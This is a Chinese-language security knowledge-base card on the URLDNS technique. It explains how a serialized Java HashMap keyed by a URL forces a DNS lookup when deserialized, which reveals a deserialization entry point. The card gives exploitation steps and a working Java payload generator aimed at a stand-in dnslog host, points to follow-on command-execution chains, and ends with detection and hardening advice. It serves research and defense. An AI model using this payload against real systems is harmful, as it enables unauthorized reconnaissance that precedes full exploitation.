---
id: web-java-deser-jdk-urldns-dns-probe
title: URLDNS 利用 HashMap 与 URL.hashCode 探测反序列化入口
type: scenario
domain: web
path: web/java/deserialization/jdk
technique: urldns-hashmap-url-hashcode
aliases:
- URLDNS
- DNS 探测反序列化
- HashMap URL hashCode
- 反序列化入口探测
- dnslog 反序列化
tags:
- java
- deserialization
- urldns
- dns
- detection
- hashmap
- url
- jdk
cve: []
severity: low
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V18
  verified_at: '2026-11-05T02:08:48+08:00'
  notes: 已对照原文核对：HashMap.put/readObject 触发 URL.hashCode、hashCode 字段 transient 初值 -1、先反射置 1 再置 -1 避免生成端 DNS、DNSLOG 验证均与原文一致；URLDNS 仅作入口探测，卡片已标 low severity
---

## 一句话结论

用 `HashMap` 把 `java.net.URL` 作为 key 序列化，目标反序列化 `HashMap.readObject()` 时会对 key 调用 `hashCode()`，`URL.hashCode()` 触发对 URL 主机的 DNS 解析；攻击者只需观察自己的 DNS 日志即可判断目标是否存在 Java 原生反序列化入口，且不需要任何第三方 gadget。

## 原理

- `HashMap.readObject()` 在恢复键值对时调用 `putVal(hash(key), key, value, ...)`，其中 `hash(key)` 会调用 `key.hashCode()`。
- `java.net.URL.hashCode()` 的实现是：若 `hashCode == -1`，则调用 `handler.hashCode(this)`；URL 的默认 handler 会解析主机名（DNS 查询），随后把结果缓存到 `hashCode` 字段。因此对一个指向攻击者域名的 URL 计算 hashCode 会产生一次 DNS 请求。
- URL 的 `hashCode` 字段是 transient，反序列化后为初始值 -1，所以 `HashMap.readObject()` 时一定会重新计算并触发 DNS。
- 在生成 payload 时，`HashMap.put(url, null)` 本身也会调用 `url.hashCode()`，导致生成端先发一次 DNS 请求，干扰“到底是生成时还是目标反序列化时触发”的判断。解决方法是反射把 `URL.hashCode` 先设为非 -1 的值（如 1），完成 `put` 后再设回 -1，再序列化。
- URLDNS 只证明“目标会反序列化”，不执行命令、不加载类，因此适合作为无副作用的存在性探测。

## 触发条件

- 目标存在 Java 原生反序列化入口（`ObjectInputStream.readObject()` 处理不可信数据）。
- 目标 JDK 的 `java.net.URL`/`HashMap` 未被过滤（JEP 290 未拦截）。
- 目标能发起 DNS 查询（可出网到攻击者 DNS 服务器；内网也可用可控 DNS 日志）。
- 不需要 Commons Collections 等第三方库；URLDNS 是 JDK 自带链。

## 利用步骤

1. 准备一个可控 DNS 域名（dnslog 平台或自建 DNS）。
2. 构造 `HashMap`，key 为 `new URL("http://<唯一子域名>.<dnslog域名>")`，value 为 null。
3. 反射把 URL 的 `hashCode` 设为 1，执行 `hashMap.put(url, null)`，避免生成端 DNS 请求。
4. 反射把 `hashCode` 设回 -1，序列化 `HashMap` 得到 payload。
5. 把 payload 发送到目标反序列化入口，观察 DNS 日志是否出现唯一子域名。
6. DNS 命中说明目标执行了 `HashMap.readObject` → `URL.hashCode`，即存在反序列化入口。

## PoC

```java
import java.io.*;
import java.lang.reflect.Field;
import java.net.URL;
import java.util.Base64;
import java.util.HashMap;

public class UrlDns {
    public static void main(String[] args) throws Exception {
        HashMap<Object, Object> map = new HashMap<>();
        URL url = new URL("http://<unique>.dnslog.example/");

        Field f = URL.class.getDeclaredField("hashCode");
        f.setAccessible(true);
        f.set(url, 1);            // 避免 put 时触发 DNS

        map.put(url, null);       // 生成端不解析

        f.set(url, -1);           // 反序列化时重新计算

        ByteArrayOutputStream bos = new ByteArrayOutputStream();
        try (ObjectOutputStream oos = new ObjectOutputStream(bos)) {
            oos.writeObject(map);
        }
        System.out.println(Base64.getEncoder().encodeToString(bos.toByteArray()));
    }
}
```

```text
# 目标反序列化后，DNS 日志出现：
# <unique>.dnslog.example 的 A/AAAA 查询
```

## 变体与关联

- 变体：也可用 `TreeMap`/`Hashtable` 等会在反序列化时调用 key 方法的容器，但 `HashMap` 最稳定。
- 变体：URL 可使用 `http`、`https`、`ftp` 等协议；不同 handler 都可能触发主机解析。
- 关联：[[web-java-deser-commonscollections-cc1-transformedmap]]（确认入口后的实际利用链）；[[web-java-deser-commonscollections-cc6-cc3-templatesimpl]]（JDK 兼容性更好的命令执行链）。
- 边界：目标 DNS 出网被完全阻断、JEP 290 过滤器拒绝 `java.net.URL`/`HashMap`、或反序列化入口不使用 `ObjectInputStream` 时，DNS 不会命中；DNS 未命中也不能完全排除入口（可能仅 DNS 被阻断）。

## 检测与防御

- 检测：监控 Java 进程的异常 DNS 查询（尤其是反序列化请求后立即出现的外部域名）；在序列化流中检测 `java.net.URL` 与 `HashMap` 组合；对反序列化入口做流量审计。
- 修复：消除不可信 Java 原生反序列化；必须使用时配置 JEP 290 `ObjectInputFilter` 白名单，拒绝 `java.net.URL` 等非业务类。
- 加固：限制服务器 DNS 出网；使用 DNS 日志与威胁情报告警；升级 JDK 并保持过滤器开启。
